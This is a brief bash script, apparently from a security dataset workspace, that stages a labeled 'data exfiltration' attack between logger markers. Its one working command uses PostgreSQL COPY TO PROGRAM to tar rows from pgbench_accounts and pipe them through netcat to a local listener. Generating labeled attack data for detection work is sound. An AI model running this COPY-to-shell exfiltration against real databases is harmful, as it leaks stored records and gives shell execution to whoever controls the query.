#!/bin/bash
echo "Simulating Data Exfiltration Attack (tar + nc)..."
/dataset_workspace/logger.sh mark_attack "attack_exfil_tar_nc" start
psql -U postgres -d casce_tpcb -c "COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'tar -czf /tmp/exfil_tar_nc.dat - && nc -w 1 127.0.0.1 9090 < /tmp/exfil_tar_nc.dat 2>/dev/null || true';"
/dataset_workspace/logger.sh mark_attack "attack_exfil_tar_nc" end
